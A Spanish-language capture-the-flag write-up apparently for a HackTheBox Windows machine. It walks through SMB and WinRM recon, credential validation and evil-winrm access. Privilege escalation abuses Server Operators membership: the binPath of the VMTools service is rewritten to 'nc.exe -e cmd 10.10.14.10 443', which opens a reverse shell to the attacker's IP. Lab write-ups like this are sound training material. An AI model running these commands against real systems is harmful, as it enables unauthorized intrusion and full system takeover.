## Summary

- IP -> 
- Ports -> TCP (53,80,88,135,139,389,445,), UDP (idk)
- OS ->  Windows 
- Services & Applications
    - 80  -> HTTP microsoft IIS/10.0
    -  -> 

## Recon
Windows IIS (10.0)
❯ **whatweb http://< URL>**  Nos dara una breve descripcion del gestor de contenidos del puerto 80

Nos ponemos a explorar la pagina web y encontramos que podiamos hacer que la pagina al momento de hacerle Update, esta apuntara a nuestra IP y asi con nc ver el contenido y nos devuelve un User y una Passwd

❯ **crackmapexec smb {ip_targeted} -u {‘user’} -p {‘password’}** Para el servicio **445/tcp smb** abierto podemos utilizar el siguiente comando para saber si tenemos credenciales validas, por lo que si nos muestra un **(****+****)** quiere decir que si son validas, ademas de que nos da informacion de lo que hay en ese servico (nombre, Window 10.0, dominio, signing=true)(u=user, p=password) Este comando es usado para validar aunque tenga mas aplicaciones.

❯ **smbclient -L** **{ip_targeted}** Lista recursos compartidos a nivel de red haciendo uso de un null sesion (sin credencial alguna)

❯ **smbmap -H** **{ip_targeted}** Herramienta elternativa para ver si nos reporta algo mas

❯ **crackmapexec winrm {ip_targeted} -u {‘user’} -p {‘password’}**
Despues de saber que las credenciales son validas con crackmapexec, podemos utilizar el puerto de winrm para saber si podemos entrar, pero antes debemos saber si el usuario esta en el grupo **Remote management users**, para saber si pertenece nos debe poner un (Pwn3d!) y asi podernos autenticar.


## User
Ahora podemos usar el puerto 5985 para poder ingresar con WINRM
❯ **evil-winrm -i ❮IP_Target❯ -u ❮Username❯ -p ❮Passwd❯** Con este comando nos conecta al servicio de winrm y podemos entrar a la maquina

Una vez adentro buscamos la flag del usuario user.txt en Desktop

Ahora nos disponemos a probar comandos para ver como poder escalar privilegios en la maquina Windows
❯ **whoami /priv** Miramos los privilegios que tenemos  
	**SeInpersonatePrivilege** En el cual podriamos usar RottenPotato o  JuicyPotato 

❯ **Systeminfo** 
	Nos copiamos todo lo que nos salga con ese comando y usaremos un programa llamado '' para deterctar vulnerabilidades en un equipo Windows, todo desde nuestra maquina Linux con el archivo que hemos creado con ese informacion obtenida.

❯ **net user < USER>** Nos da detalles de nuestro usuario y vemos a que grupos pertenecemos. El grupo que nos interesa en este caso es **Server Operators** ya que en el podemos administrar controladores de dominio, loggearse a un servicio interactivo, asi como crear, borrar recursos compartidos en la red, iniciar, parar servicios, back up, restaurar archivos, formatear el disco duro de la computadora y apagarla. Por lo que debemos verificar sipertenecemos a este grupo.

Ahora buscamos en Google la parte de Server Operators para ver que significa y que podemos hacer.
Los miembros de **Server Operators** pueden administrar el domain controller. Pueden hacer las siguientes acciones, iniciar sesión en un servidor de forma interactiva, crear y eliminar recursos compartidos de red, iniciar y detener servicios, realizar copias de seguridad y restaurar archivos, formatear la unidad de disco duro de la computadora y apagar la computadora. Este grupo no puede ser renombrado, eliminado o removido.

Por lo que nos ponemos a utilizar Netcat para poder entrar 
Buscamos el archivo nc.exe en la maquina atacante para despues subirlo a la maquina victima en el directorio Temp, ya que en ese directorio hay permisos de lectura y escritura.

❯ **upload /home/omar/Docume/HTB/nc.exe** Subimos el archivo del Netcat a la maquina victima 

Despues podemos crear una revershell y ver si podemos crear un servicio 
❯ **sc.exe create** **reverse** **binPath=”C:\\Users\\svc-printer\\Documents\\nc.exe -e cmd 10.10.14.10 443”** Le decimos al equipo victima que cuando arranque el servicio queremos que ejecute el netcat y nos ejecute una revershell contra el nuestro equipo por el puerto 443. (create=creamos el servicio, reverse=nombre del servicio) 

Como no podemos crear un servicio, nos ponemos a manipular el binPath de uno ya existente.
❯ **Services** Para ver los servicios que estan corriendo en Windows y asi ver si podemos cambiarle el binPath a uno, esto dependiendo si nos encontramos en el grupo 

Utilizamos un servicio de los que ya estan corriendo en esa maquina victima y le cambiaremos el binPath para que primero lo paremos y despues cuando lo arranquemos este nos ejecute el netcat.
❯ **sc.exe config VMTools binPath=”C:\\Users\\svc-printer\\Documents\\nc.exe -e cmd 10.10.14.10 443”** Colocaremos un servicio que nos deje cambiar su binPath, el servicio va despues de config. (Nos saldra success)

## Root

Despues paramos el servicio que hemos reconfigurado y lo volvemos a iniciar para que se ejecute el netcat.
❯ **sc.exe stop VMTools** Paramos el servicio
❯ **sc.exe start VMTools** Iniciamos el servicio

Nos damos cuenta que ya somo **NT Autority System** y tenemos los privilegios de administrador, por lo que nos dirigimos a buscar la flag en el desktop de root.
❯ **cd C:\\Users\\Administrator\\Desktop**
❯ **dir** para mirar que hay dentro del directorio
❯ **type** **root.txt** para mirar el contenido de un archivo


